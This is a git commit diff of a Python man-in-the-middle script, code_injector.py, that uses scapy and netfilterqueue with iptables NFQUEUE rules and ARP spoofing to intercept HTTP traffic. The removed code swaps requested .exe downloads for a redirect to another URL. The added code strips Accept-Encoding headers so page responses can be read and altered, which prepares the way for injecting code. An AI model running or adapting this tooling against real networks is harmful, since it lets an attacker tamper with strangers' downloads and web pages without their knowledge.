35d6404e189e9faf728352ae0ea0cec795a4e4fe
m1ntko <chetaniguzman@gmail.com>
2021-03-16 19:20:20 -0400

    Upload code_injector and replace_downloads.

--- code_injector.py
+++ code_injector.py
@@ -1,14 +1,14 @@
 #!/usr/bin/env python
 import netfilterqueue
 import scapy.all as scapy
-
+import re
 # First:
 # iptables -I FORWARD -j NFQUEUE --queue-num 0  --> for mitm and with arp_spoof.py
 # iptables -I OUTPUT -j NFQUEUE --queue-num 0   --> own computer
 # iptables -I INPUT -j NFQUEUE --queue-num 0    --> own computer
 # iptables flush  --> back to normal
 
-ack_list = []
+
 def set_load(packet, load):
     packet[scapy.Raw].load = load
     del packet[scapy.IP].len
@@ -21,16 +21,14 @@ def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):      
         if scapy_packet[scapy.TCP].dport == 80:      
-            if ".exe" in str(scapy_packet[scapy.Raw].load):
-                print("[+] Attemp to download file .exe format.")
-                ack_list.append(scapy_packet[scapy.TCP].ack)
+            print("[+] Request")
+            # Delete Accept-Encoding and its content
+            modified_load = re.sub("Accept-Encoding:.*?\\r\\n","", scapy_packet[scapy.Raw].load)
+            new_packet = set_load(scapy_packet, modified_load)
+            packet.set_payload(str(new_packet))
         elif scapy_packet[scapy.TCP].sport == 80:
-            if scapy_packet[scapy.TCP].seq in ack_list:
-                ack_list.remove(scapy_packet[scapy.TCP].seq)
-                print("[+] Replacing file changing the packet load.")
-                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://ichef.bbci.co.uk/news/640/cpsprodpb/150EA/production/_107005268_gettyimages-611696954.jpg\n\n")
-                
-                packet.set_payload(bytes(modified_packet))
+            print("[+] Response")
+            print(scapy_packet.show())
     packet.accept()
 
 queue = netfilterqueue.NetfilterQueue()
